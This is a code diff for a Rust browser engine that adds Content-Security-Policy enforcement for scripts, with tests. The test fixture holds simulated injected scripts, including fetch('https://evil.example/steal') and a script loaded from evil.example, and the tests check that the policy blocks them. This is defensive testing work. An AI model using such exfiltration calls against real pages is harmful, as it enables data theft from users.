@@ -226,14 +226,35 @@ impl Page {
     /// Parse a document and run its scripts (only ever in the sandboxed
     /// renderer). Returns the page and the script runtime, which keeps the
     /// page alive for events.
+    /// `csp`: the page's `Content-Security-Policy` headers; its scripts
+    /// are held to them and to any `<meta http-equiv>` policy in the page.
     pub fn load_with_scripts(
         url: &str,
         src: &str,
         blocker_css: &str,
         viewport: (f32, f32),
+        csp: &[String],
         host: &mut dyn Host,
     ) -> (Page, Option<Runtime>, ScriptOutput) {
         let tree = html::parse(src);
+        let mut policy = crate::csp::Csp::new(url);
+        for h in csp {
+            policy.add(h);
+        }
+        let mut metas = Vec::new();
+        tree.walk(&mut metas, &|n| {
+            n.element().is_some_and(|e| {
+                e.tag == "meta"
+                    && e.attrs
+                        .get("http-equiv")
+                        .is_some_and(|h| h.trim().eq_ignore_ascii_case("content-security-policy"))
+            })
+        });
+        for m in metas {
+            if let Some(c) = m.element().and_then(|e| e.attrs.get("content")) {
+                policy.add(c);
+            }
+        }
         // The server's own stylesheets, fetched before scripts can change
         // anything, and every file the document refers to.
         let mut first = Page::empty(url, blocker_css, true);
@@ -253,6 +274,7 @@ impl Page {
             }
         };
         rt.set_cookies(host.cookies());
+        rt.set_csp(policy);
         let until = Instant::now() + js::LOAD_BUDGET;
         let mut loader = ScriptLoader {
             fetched: 0,
@@ -263,7 +285,7 @@ impl Page {
             if Instant::now() >= until {
                 break;
             }
-            loader.run(&mut rt, id, src, code, host);
+            loader.run(&mut rt, id, src, code, host, true);
             loader.run_pending(&mut rt, host);
             pump(&mut rt, host, until);
         }
@@ -1186,7 +1208,22 @@ struct ScriptLoader<'a> {
 }
 
 impl ScriptLoader<'_> {
-    fn run(&mut self, rt: &mut Runtime, id: u32, src: Option<String>, code: String, host: &mut dyn Host) {
+    /// `parser_inserted`: the script came with the document (rather than
+    /// being added by a script).
+    fn run(
+        &mut self,
+        rt: &mut Runtime,
+        id: u32,
+        src: Option<String>,
+        code: String,
+        host: &mut dyn Host,
+        parser_inserted: bool,
+    ) {
+        // The page's Content Security Policy first: a refused script isn't
+        // even fetched.
+        if !rt.script_allowed(id, src.as_deref(), &code, parser_inserted) {
+            return;
+        }
         let (code, name) = match src {
             Some(url) if self.fetched < js::MAX_SCRIPTS => {
                 self.fetched += 1;
@@ -1214,7 +1251,7 @@ impl ScriptLoader<'_> {
                 return;
             }
             for (id, src, code) in pending {
-                self.run(rt, id, src, code, host);
+                self.run(rt, id, src, code, host, false);
             }
         }
     }
@@ -1304,7 +1341,7 @@ mod form_script_tests {
     fn load(html: &str) -> (Page, Runtime) {
         let mut host = FetchOnly(|_: &str, _: Dest| Err("none".to_string()));
         let (page, rt, _) =
-            Page::load_with_scripts("https://example.com/", html, "", (800.0, 600.0), &mut host);
+            Page::load_with_scripts("https://example.com/", html, "", (800.0, 600.0), &[], &mut host);
         let _ = page.render(800.0, 600.0);
         (page, rt.expect("scripts run"))
     }
@@ -1989,5 +2026,137 @@ mod layer_tests {
         // No `top`: it never sticks, so it isn't a layer.
         let r = render("<div style='position:sticky'>x</div>");
         assert!(r.layers.is_empty());
+    }
+}
+
+#[cfg(test)]
+mod csp_tests {
+    use super::*;
+
+    /// Records what the page fetched and what its scripts asked to send.
+    #[derive(Default)]
+    struct Recorder {
+        fetched: Vec<String>,
+        requested: Vec<String>,
+    }
+
+    impl Host for Recorder {
+        fn fetch(&mut self, url: &str, _: Dest) -> Result<String, String> {
+            self.fetched.push(url.to_string());
+            Ok("document.getElementById('o').textContent += ' ' + document.currentScript.src.split('/').pop();".into())
+        }
+        fn request(&mut self, url: &str, _: ScriptRequest) -> Result<ScriptResponse, String> {
+            self.requested.push(url.to_string());
+            Err("no network".into())
+        }
+        fn set_cookie(&mut self, _: &str) {}
+        fn cookies(&mut self) -> String {
+            String::new()
+        }
+    }
+
+    fn load(html: &str, csp: &[&str]) -> (Page, Runtime, Recorder, Vec<String>) {
+        let mut host = Recorder::default();
+        let csp: Vec<String> = csp.iter().map(|s| s.to_string()).collect();
+        let (page, rt, out) =
+            Page::load_with_scripts("https://site.example/", html, "", (800.0, 600.0), &csp, &mut host);
+        (page, rt.expect("scripts run"), host, out.console)
+    }
+
+    fn text(rt: &mut Runtime) -> String {
+        rt.run_script(
+            "console.log('TEXT ' + document.getElementById('o').textContent)",
+            0,
+            "t",
+        );
+        rt.take_console()
+            .into_iter()
+            .find_map(|l| l.strip_prefix("[log] TEXT ").map(str::to_string))
+            .unwrap_or_default()
+    }
+
+    const PAGE: &str = "<p id=o>start</p>\
+        <script nonce=n1>const o = document.getElementById('o'); o.textContent += ' trusted';\
+          try { eval('1'); o.textContent += ' EVAL'; } catch (e) { o.textContent += ' no-eval'; }\
+          setTimeout(\"document.getElementById('o').textContent += ' TIMER'\", 0);\
+          fetch('https://evil.example/steal').catch(() => {}); fetch('/same').catch(() => {});\
+          const s = document.createElement('script'); s.src = 'https://cdn.example/dyn.js'; document.body.appendChild(s);\
+        </script>\
+        <script>document.getElementById('o').textContent += ' INJECTED';</script>\
+        <script src=https://evil.example/injected.js></script>\
+        <button id=b onclick=\"document.getElementById('o').textContent += ' HANDLER'\">x</button>";
+
+    #[test]
+    fn the_servers_policy_holds_injected_scripts() {
+        let (_, mut rt, host, console) = load(
+            PAGE,
+            &["script-src 'nonce-n1' 'strict-dynamic'; connect-src 'self'; report-uri https://reports.example/"],
+        );
+        rt.run_script("document.getElementById('b').click()", 0, "click");
+        let t = text(&mut rt);
+        assert!(t.starts_with("start trusted no-eval"), "{t}");
+        for bad in ["INJECTED", "EVAL", "HANDLER", "injected.js", "TIMER"] {
+            assert!(!t.contains(bad), "{bad}: {t}");
+        }
+        assert!(
+            t.contains("dyn.js"),
+            "'strict-dynamic' trusts what a trusted script adds: {t}"
+        );
+        // A refused script isn't even fetched; nothing goes to the report
+        // address; connect-src kept the request to the page's own origin.
+        assert!(
+            !host.fetched.iter().any(|u| u.contains("injected.js")),
+            "{:?}",
+            host.fetched
+        );
+        assert!(!host
+            .fetched
+            .iter()
+            .chain(&host.requested)
+            .any(|u| u.contains("reports.")));
+        assert_eq!(host.requested, vec!["https://site.example/same"]);
+        assert!(
+            console
+                .iter()
+                .any(|l| l.starts_with("[csp] refused to run an inline script")),
+            "{console:?}"
+        );
+    }
+
+    #[test]
+    fn meta_policies_and_allowed_inline_code() {
+        // From a <meta>, with 'unsafe-inline': inline scripts and handlers
+        // run, but strings still don't become code.
+        let page = format!(
+            "<meta http-equiv=Content-Security-Policy content=\"script-src 'self' 'unsafe-inline'\">{PAGE}"
+        );
+        let (_, mut rt, host, _) = load(&page, &[]);
+        rt.run_script("document.getElementById('b').click()", 0, "click");
+        let t = text(&mut rt);
+        assert!(
+            t.contains("trusted no-eval") && t.contains("INJECTED") && t.contains("HANDLER"),
+            "{t}"
+        );
+        assert!(!t.contains("dyn.js") && !t.contains("injected.js"), "{t}");
+        assert!(
+            !host.fetched.iter().any(|u| u.contains("example/")),
+            "{:?}",
+            host.fetched
+        );
+        // Without a policy, everything runs as before.
+        let (_, mut rt, _, _) = load(PAGE, &[]);
+        rt.run_script("document.getElementById('b').click()", 0, "click");
+        let t = text(&mut rt);
+        for want in [
+            "trusted",
+            "EVAL",
+            "INJECTED",
+            "HANDLER",
+            "dyn.js",
+            "injected.js",
+            "TIMER",
+        ] {
+            assert!(t.contains(want), "{want}: {t}");
+        }
     }
 }
